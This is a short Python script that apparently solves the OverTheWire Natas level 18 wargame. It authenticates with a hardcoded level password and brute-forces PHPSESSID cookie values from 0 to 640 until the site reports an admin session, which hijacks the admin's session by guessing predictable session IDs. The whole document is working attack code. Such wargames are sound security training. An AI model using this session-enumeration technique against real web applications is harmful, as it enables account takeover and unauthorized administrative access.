import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()
session.auth = HTTPBasicAuth("natas18", "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")

for i in range(0, 641):
    custom_cookie = {"PHPSESSID": str(i)}
    response = session.get("http://natas18.natas.labs.overthewire.org/index.php", cookies=custom_cookie)
    print(f"Trying PHPSESSID: {i}")

    if "You are an admin" in response.text:
        print(f"Found admin session with PHPSESSID: {i}")
        break